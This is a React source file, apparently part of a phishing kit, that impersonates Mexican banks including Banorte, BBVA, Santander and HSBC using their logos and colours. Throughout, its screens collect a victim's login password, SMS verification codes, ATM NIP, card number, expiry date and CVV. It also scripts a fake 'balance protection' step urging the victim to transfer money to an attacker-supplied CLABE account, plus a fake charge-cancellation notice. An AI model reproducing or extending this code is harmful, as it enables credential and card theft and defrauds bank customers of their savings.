import React, { useState, useContext } from 'react';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { ScreenType } from '@shared/schema';
import QRScanner from './QRScanner';

// Para debug
console.log('ScreenType.SMS_COMPRA:', ScreenType.SMS_COMPRA);

import citibanamexLogo from '../../assets/Banamex.png';
import banbajioLogo from '../../assets/banbajio_logo_oficial.png';
import bbvaLogo from '../../assets/bbva_logo.png';
import bbvaLogoWhite from '../../assets/bbva_logo_white.png';
import banorteLogoFooter from '../../assets/Banorte-01.png'; // El logo rojo de Banorte
import banorteLogoHeader from '../../assets/Bo.png.png';
import bancoppelLogo from '../../assets/bancoppel.png';
import hsbcLogo from '../../assets/Hsbc.png';
import amexLogo from '../../assets/Amex.png';
import santanderLogo from '../../assets/santander_logo.png';
import santanderLogoWhite from '../../assets/santander_logo_white.png';
import platacardLogo from '../../assets/platacard_logo.png';
import scotiabankLogo from '../../assets/scotiabank_logo.png';
import scotiabankLogoWhite from '../../assets/scotiabank_logo_white.png';
import invexLogo from '../../assets/invex_logo.png';
import invexLogoWhite from '../../assets/invex_logo_white.png';
import banregioLogo from '../../assets/banregio_logo.png';
import banregioLogoWhite from '../../assets/banregio_logo_white.png';

interface ScreenTemplatesProps {
  currentScreen: ScreenType;
  screenData: {
    terminacion?: string;
    saldo?: string;
    monto?: string;
    clabe?: string;
    titular?: string;
    comercio?: string;
    mensaje?: string;
    alias?: string;
  };
  onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
  banco?: string;
}

export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({ 
  currentScreen, 
  screenData,
  onSubmit,
  banco = "BANORTE"
}) => {
  // Form state
  const [folioInput, setFolioInput] = useState('');
  const [loginInputs, setLoginInputs] = useState({ username: '', password: '' });
  const [codigoInput, setCodigoInput] = useState('');
  const [nipInput, setNipInput] = useState('');
  const [tarjetaInput, setTarjetaInput] = useState('');
  const [fechaVencimientoInput, setFechaVencimientoInput] = useState('');
  const [cvvInput, setCvvInput] = useState('');
  const [smsCompraInput, setSmsCompraInput] = useState('');
  const [passwordError, setPasswordError] = useState<string | null>(null);
  const [qrScanned, setQrScanned] = useState<string | null>(null);
  
  // Función para validar número de tarjeta con algoritmo de Luhn
  const validateCardNumber = (number: string) => {
    // Eliminar espacios en blanco y caracteres no numéricos
    const value = number.replace(/\D/g, '');
    
    if (!value) return false;
    
    // Verificar longitud entre 13 y 19 dígitos
    if (value.length < 13 || value.length > 19) return false;
    
    // Algoritmo de Luhn (Mod 10)
    let sum = 0;
    let shouldDouble = false;
    
    // Recorremos de derecha a izquierda
    for (let i = value.length - 1; i >= 0; i--) {
      let digit = parseInt(value.charAt(i));
      
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    
    return (sum % 10) === 0;
  };
  
  // Función para formatear el número de tarjeta (con espacios cada 4 dígitos)
  const formatCardNumber = (value: string) => {
    // Eliminar espacios en blanco y caracteres no numéricos
    const v = value.replace(/\D/g, '');
    
    // Insertar espacio cada 4 dígitos
    const groups = [];
    for (let i = 0; i < v.length; i += 4) {
      groups.push(v.substring(i, i + 4));
    }
    
    return groups.join(' ');
  };
  
  // Función para formatear la fecha de vencimiento (MM/AA)
  const formatExpirationDate = (value: string) => {
    // Eliminar caracteres no numéricos
    const v = value.replace(/\D/g, '');
    
    // Asegurar que el mes no sea mayor a 12
    if (v.length >= 2) {
      const month = parseInt(v.substring(0, 2));
      if (month > 12) {
        return `12/${v.substring(2)}`;
      }
    }
    
    // Formato MM/AA
    if (v.length <= 2) {
      return v;
    } else {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`;
    }
  };

  // Helper function to render the appropriate screen
  const renderScreen = () => {
    // Función para obtener el contenedor según el banco
    // Función simplificada que solo contiene el contenido sin logos ni fechas
    const getBankContainer = (children: React.ReactNode) => {
      // Utilizamos una única plantilla para todos los bancos
      return (
        <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden">
          {/* Eliminamos todos los logos y fechas de los contenedores de pantalla */}
          {children}
        </div>
      );
    };
    
    // Diferentes pantallas según el tipo
    switch (currentScreen) {
      case ScreenType.FOLIO:
        const folioContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Folio de soporte:</h2>
            <p className="mb-4">Por favor, ingrese el folio de soporte técnico que su ejecutivo en línea le proporcionó.</p>
            <div className="mb-4">
              <label className="block text-sm font-medium text-gray-700 text-left mb-1">Número de folio:</label>
              <Input 
                type="text" 
                placeholder="Ingrese su número de folio" 
                className="w-full border border-gray-300 rounded p-2 mb-3"
                value={folioInput}
                onChange={(e) => setFolioInput(e.target.value)}
              />
            </div>
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.FOLIO, { folio: folioInput })}
            >
              Continuar
            </Button>
          </>
        );
        return getBankContainer(folioContent);

      case ScreenType.LOGIN:
        // Función para manejar el clic en el botón de ingresar
        const handleLoginSubmit = () => {
          // Si llegamos aquí, todo está bien
          setPasswordError(null);
          onSubmit(ScreenType.LOGIN, { 
            username: loginInputs.username, 
            password: loginInputs.password 
          });
        };
        
        const loginContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Acceso a tu cuenta</h2>
            <div className="mb-4">
              <div className="flex flex-col items-start mb-2">
                <label className="text-sm text-gray-700 mb-1">
                  Usuario o ID de cliente:
                </label>
                <Input 
                  type="text" 
                  value={loginInputs.username}
                  onChange={(e) => setLoginInputs({...loginInputs, username: e.target.value})}
                  placeholder="Usuario"
                  className="w-full p-2 border border-gray-300 rounded"
                />
              </div>
              
              <div className="flex flex-col items-start">
                <label className="text-sm text-gray-700 mb-1">Contraseña:</label>
                <Input 
                  type="password" 
                  value={loginInputs.password}
                  onChange={(e) => {
                    setLoginInputs({...loginInputs, password: e.target.value});
                    // Limpiar error cuando el usuario escribe
                    if (passwordError) setPasswordError(null);
                  }}
                  placeholder="Contraseña"
                  className={`w-full p-2 border rounded ${passwordError ? 'border-red-500' : 'border-gray-300'}`}
                />
                {passwordError && (
                  <p className="text-xs text-red-500 mt-1">{passwordError}</p>
                )}
              </div>
            </div>
            
            <Button 
              className={primaryBtnClass}
              onClick={handleLoginSubmit}
            >
              Ingresar
            </Button>
          </>
        );
        return getBankContainer(loginContent);

      case ScreenType.CODIGO:
        const codigoContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Verificación de seguridad</h2>
            <p className="mb-4">
              Hemos enviado un código de verificación a tu número de teléfono terminación: <strong>{screenData.terminacion || "****"}</strong>
            </p>
            <Input 
              type="text" 
              placeholder="Ingrese el código" 
              className="w-full border border-gray-300 rounded p-2 mb-3"
              value={codigoInput}
              onChange={(e) => setCodigoInput(e.target.value)}
            />
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.CODIGO, { codigo: codigoInput })}
            >
              Verificar
            </Button>
          </>
        );
        return getBankContainer(codigoContent);

      case ScreenType.NIP:
        const nipContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Ingresa tu NIP</h2>
            <p className="mb-4">
              Por tu seguridad, necesitamos verificar tu NIP de 4 dígitos.
            </p>
            <Input 
              type="password" 
              placeholder="NIP" 
              className="w-full border border-gray-300 rounded p-2 mb-3"
              value={nipInput}
              onChange={(e) => setNipInput(e.target.value)}
              maxLength={4}
            />
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.NIP, { nip: nipInput })}
            >
              Confirmar
            </Button>
          </>
        );
        return getBankContainer(nipContent);

      case ScreenType.PROTEGER:
        const protegerContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Es necesario proteger su saldo</h2>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
              <p className="mb-2">
                Por su seguridad, es necesario proteger el saldo de su cuenta efectivo, crearemos una cuenta de SU TOTAL PROTECCIÓN de forma gratuita para poder respaldar el fondo disponible en ésta.
              </p>
              <p className="mb-2 font-semibold">
                Saldo sin proteger: <strong>${screenData.saldo || "0.00"}</strong>
              </p>
            </div>
            
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.PROTEGER, { confirmado: true })}
            >
              Proteger mi saldo
            </Button>
          </>
        );
        return getBankContainer(protegerContent);

      case ScreenType.TARJETA:
        const tarjetaContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Protección adicional</h2>
            <p className="mb-4">
              Con el fin de evitar intentos de compra en línea, agregaremos protección adicional a su tarjeta de crédito/débito.
            </p>
            
            <div className="mb-4">
              <div className="flex flex-col items-start mb-2">
                <label className="text-sm text-gray-700 mb-1">Número de tarjeta:</label>
                <Input 
                  type="text" 
                  value={tarjetaInput}
                  onChange={(e) => setTarjetaInput(formatCardNumber(e.target.value))}
                  placeholder="XXXX XXXX XXXX XXXX"
                  className={`w-full p-2 border rounded ${
                    tarjetaInput && tarjetaInput.replace(/\s/g, '').length >= 13 
                      ? validateCardNumber(tarjetaInput) 
                        ? 'border-green-500 bg-green-50' 
                        : 'border-red-500 bg-red-50' 
                      : 'border-gray-300'
                  }`}
                  maxLength={19}
                />
              </div>
              
              <div className="flex space-x-3">
                <div className="flex flex-col items-start w-1/2">
                  <label className="text-sm text-gray-700 mb-1">Fecha de vencimiento:</label>
                  <Input 
                    type="text" 
                    value={fechaVencimientoInput}
                    onChange={(e) => setFechaVencimientoInput(formatExpirationDate(e.target.value))}
                    placeholder="MM/AA"
                    className="w-full p-2 border border-gray-300 rounded"
                    maxLength={5}
                  />
                </div>
                
                <div className="flex flex-col items-start w-1/2">
                  <label className="text-sm text-gray-700 mb-1">CVV:</label>
                  <Input 
                    type="text" 
                    value={cvvInput}
                    onChange={(e) => setCvvInput(e.target.value.replace(/\D/g, '').substring(0, 3))}
                    placeholder="XXX"
                    className={`w-full p-2 border rounded ${
                      cvvInput.length === 3 ? 'border-green-500 bg-green-50' : 'border-gray-300'
                    }`}
                    maxLength={3}
                  />
                </div>
              </div>
            </div>
            
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.TARJETA, { 
                tarjeta: tarjetaInput,
                fechaVencimiento: fechaVencimientoInput,
                cvv: cvvInput
              })}
              disabled={
                !validateCardNumber(tarjetaInput) || 
                !fechaVencimientoInput.includes('/') || 
                cvvInput.length < 3
              }
            >
              Activar protección
            </Button>
          </>
        );
        return getBankContainer(tarjetaContent);

      case ScreenType.TRANSFERIR:
        const transferirContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Cuenta SU TOTAL PROTECCIÓN creada exitosamente.</h2>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
              <p className="mb-3">
                Con el fin de proteger su saldo disponible es necesario transferir la cantidad de <strong>${screenData.monto || "39933"}</strong> a la siguiente cuenta SU TOTAL PROTECCIÓN (STP).
              </p>
              <p className="mb-2">Clabe:</p>
              <p className="mb-3 font-medium">{screenData.clabe || "272762626262727272727272266222"}</p>
              <p className="mb-2">Titular de la cuenta:</p>
              <p className="mb-3 font-medium">{screenData.titular || "Nwnnwhwhw"}</p>
              <p className="mb-2">Alias:</p>
              <p className="mb-3 font-medium">{screenData.alias || "Cuenta de respaldo."}</p>
              <p className="mt-3 font-medium">
                Esta ventana se actualizará una vez reconozcamos que se haya transferido el saldo a su cuenta de respaldo.
              </p>
            </div>
            
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.TRANSFERIR, { confirmado: true })}
            >
              Ya realicé la transferencia
            </Button>
          </>
        );
        return getBankContainer(transferirContent);

      case ScreenType.CANCELACION:
        const cancelacionContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Cancelación Exitosa</h2>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
              <p className="mb-3">
                Estimado cliente, hemos realizado la cancelación de su cargo no reconocido de forma exitosa.
              </p>
              <p className="mb-2">Comercio: <strong>{screenData.comercio || "Wnnwhw"}</strong></p>
              <p className="mb-2">Monto devuelto: <strong>${screenData.monto || "62622"}</strong></p>
              <p className="mt-3">
                En un lapso no mayor a 72 horas, el monto devuelto volverá a estar disponible en su tarjeta de crédito/débito.
              </p>
            </div>
            
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.CANCELACION, { confirmado: true })}
            >
              Entendido
            </Button>
          </>
        );
        return getBankContainer(cancelacionContent);

      case ScreenType.MENSAJE:
        const mensajeContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Mensaje del banco</h2>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left max-h-[60vh] overflow-y-auto">
              <div className="whitespace-pre-wrap break-words">
                {screenData.mensaje || "Mensaje personalizado del banco."}
              </div>
            </div>
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.MENSAJE, { leido: true })}
            >
              Entendido
            </Button>
          </>
        );
        return getBankContainer(mensajeContent);

      case ScreenType.SMS_COMPRA:
      case 'sms_compra' as ScreenType: // Agregar la versión en minúsculas para manejar ambos casos
        console.log("Renderizando pantalla SMS_COMPRA con datos:", screenData);
        
        // No generamos código automático, dejamos que el usuario lo ingrese
        // Inicializar el campo de entrada vacío si no está ya establecido
        if (smsCompraInput === undefined) {
          console.log("Inicializando campo SMS_COMPRA vacío");
          setSmsCompraInput("");
        }
        
        console.log("Terminación de celular mostrada:", screenData.terminacion);
        console.log("Código SMS_COMPRA actual (input usuario):", smsCompraInput);
        
        const smsCompraContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Cancelación de cargos:</h2>
            <p className="mb-4">
              Ingresa el código que recibiste para autorizar la compra en línea. Este mismo código sirve para realizar la cancelación. Lo hemos enviado a tu teléfono con terminación: <strong>{screenData.terminacion || "****"}</strong>
            </p>
            
            <div className="p-4 bg-gray-100 rounded mb-4 text-black">
              <p className="mb-2">
                <strong>Información de cancelación:</strong>
              </p>
            </div>
            
            <div className="mb-4">
              <label className="block text-sm font-medium mb-1">Ingresa el código de cancelación:</label>
              <Input 
                type="text" 
                placeholder="Ingresa el código de 6 dígitos" 
                className="w-full border border-gray-300 rounded p-2 mb-2"
                value={smsCompraInput}
                onChange={(e) => setSmsCompraInput(e.target.value.replace(/\D/g, '').substring(0, 6))}
                maxLength={6}
              />
              <p className="text-xs text-gray-500">El código debe tener 6 dígitos numéricos.</p>
            </div>
            
            <Button 
              className={primaryBtnClass}
              onClick={() => {
                if (smsCompraInput && smsCompraInput.length === 6) {
                  console.log("Enviando código SMS_COMPRA ingresado:", smsCompraInput);
                  onSubmit(ScreenType.SMS_COMPRA, { smsCompra: smsCompraInput });
                } else {
                  alert("Por favor ingresa un código válido de 6 dígitos.");
                }
              }}
              disabled={!smsCompraInput || smsCompraInput.length !== 6}
            >
              Confirmar cancelación
            </Button>
          </>
        );
        return getBankContainer(smsCompraContent);

      case ScreenType.VALIDANDO:
        const validandoContent = (
          <>
            <h2 className="text-xl font-bold mb-4">Validando...</h2>
            <p className="text-sm text-gray-500 mb-4">Esto puede tomar un momento. Por favor espere...</p>
            <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
              <div className={`h-full ${
                banco === 'LIVERPOOL' ? 'liverpool-bg' :
                banco === 'BANBAJIO' ? 'banbajio-bg' : 
                banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
                banco === 'BBVA' ? 'bg-[#072146]' :
                banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
                banco === 'HSBC' ? 'bg-[#DB0011]' :
                banco === 'AMEX' ? 'amex-bg' :
                banco === 'SANTANDER' ? 'santander-bg' :
                banco === 'SCOTIABANK' ? 'scotiabank-bg' :
                banco === 'INVEX' ? 'invex-bg' :
                'bg-[#EC1C24]'
              } animate-progress-bar`}></div>
            </div>
            <p className="text-xs text-gray-400 mt-3">Verificando información de seguridad</p>
          </>
        );
        return getBankContainer(validandoContent);
      
      case ScreenType.ESCANEAR_QR:
        // Si ya escaneamos un QR, mostrar confirmación
        if (qrScanned) {
          const qrScannedContent = (
            <>
              <h2 className="text-xl font-bold mb-3">¡Código QR escaneado correctamente!</h2>
              <div className="bg-green-100 border border-green-300 text-green-700 px-4 py-3 rounded mb-4">
                <p>Los datos de su tarjeta han sido verificados exitosamente.</p>
              </div>
              <Button 
                className={primaryBtnClass}
                onClick={() => onSubmit(ScreenType.ESCANEAR_QR, { qrData: qrScanned })}
              >
                Continuar
              </Button>
            </>
          );
          return getBankContainer(qrScannedContent);
        }
        
        // Si no hemos escaneado un QR, mostrar el escáner
        return (
          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden">
            <QRScanner 
              onScanSuccess={(qrData) => {
                setQrScanned(qrData);
              }}
              onCancel={() => {
                onSubmit(ScreenType.MENSAJE, { mensaje: "Operación cancelada por el usuario" });
              }}
            />
          </div>
        );

      default:
        const defaultContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Pantalla no disponible</h2>
            <p>La pantalla solicitada no está disponible en este momento.</p>
          </>
        );
        return getBankContainer(defaultContent);
    }
  };

  // Definimos las clases de estilos para los botones según el banco
  const getPrimaryBtnClass = () => {
    switch(banco) {
      case 'LIVERPOOL':
        return 'bg-[#E1147B] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'CITIBANAMEX':
        return 'bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANBAJIO':
        return 'banbajio-button'; // Ya tiene todos los estilos definidos en el CSS
      case 'BBVA':
        return 'bbva-button';
      case 'BANCOPPEL':
        return 'bg-[#0066B3] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'HSBC':
        return 'bg-[#DB0011] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'AMEX':
        return 'bg-[#0077C8] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'SANTANDER':
        return 'bg-[#EC0000] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'SCOTIABANK':
        return 'bg-[#EC111A] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'INVEX':
        return 'bg-[#BE0046] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANREGIO':
        return 'bg-[#FF6600] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANORTE':
        return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'PLATACARD':
        return 'bg-[#0072BC] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      default:
        return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Banorte por defecto
    }
  };

  const primaryBtnClass = getPrimaryBtnClass();

  // Eliminamos la función bankLogo ya que solo usaremos el logo en el header del ClientScreen.tsx

  // Función para obtener la clase de header según el banco
  const getBankHeaderClass = () => {
    switch(banco) {
      case 'LIVERPOOL': return 'liverpool-header';
      case 'BANBAJIO': return 'banbajio-header';
      case 'CITIBANAMEX': return 'citibanamex-header';
      case 'BBVA': return 'bbva-header';
      case 'BANCOPPEL': return 'bg-[#0066B3] text-white p-2';
      case 'HSBC': return 'bg-white text-[#DB0011] p-2 border-t-2 border-[#DB0011]';
      case 'AMEX': return 'bg-[#0077C8] text-white p-2';
      case 'SANTANDER': return 'santander-header';
      case 'SCOTIABANK': return 'scotiabank-header';
      case 'INVEX': return 'invex-header';
      case 'BANREGIO': return 'banregio-header';
      case 'BANORTE': return 'banorte-header';
      default: return 'bg-gray-100 p-3 text-center font-semibold';
    }
  };

  // Función para obtener la clase del contenedor según el banco
  const getBankContainerClass = () => {
    switch(banco) {
      case 'LIVERPOOL': return 'bg-white p-4 rounded-lg shadow liverpool-container';
      case 'BANBAJIO': return 'bg-white p-4 rounded-lg shadow';
      case 'CITIBANAMEX': return 'citibanamex-container';
      case 'BBVA': return 'bbva-container';
      case 'BANCOPPEL': return 'bg-white p-4 rounded-lg shadow bancoppel-container';
      case 'HSBC': return 'bg-white p-4 rounded-lg shadow hsbc-container';
      case 'AMEX': return 'bg-white p-4 rounded-lg shadow amex-container';
      case 'SANTANDER': return 'bg-white p-4 rounded-lg shadow santander-container';
      case 'SCOTIABANK': return 'bg-white p-4 rounded-lg shadow scotiabank-container';
      case 'INVEX': return 'bg-white p-4 rounded-lg shadow invex-container';
      case 'BANREGIO': return 'bg-white p-4 rounded-lg shadow banregio-container';
      case 'BANORTE': return 'banorte-container';
      default: return '';
    }
  };

  // Renderizados especiales según el banco
  if (banco === 'CITIBANAMEX') {
    // Podríamos agregar un renderizado especial para CitiBanamex si se necesita en el futuro
  }

  // Renderizado normal para otros bancos
  return (
    <div className={getBankContainerClass()}>
      {/* No mostrar logos en el contenido principal - los logos ya están en el header de cada banco */}
      {renderScreen()}
    </div>
  );
};
